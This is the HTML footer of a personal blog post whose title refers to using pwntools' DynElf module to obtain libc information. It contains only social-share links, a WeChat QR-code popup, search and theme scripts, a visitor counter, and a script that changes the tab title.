        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/&title=《利用DynElf模块完成获取libc信息》 — Welcome to Chumen77's Blog&pic=http://chumen77.xyz/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/&title=《利用DynElf模块完成获取libc信息》 — Welcome to Chumen77's Blog&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《利用DynElf模块完成获取libc信息》 — Welcome to Chumen77's Blog&url=http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/&via=http://chumen77.xyz" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
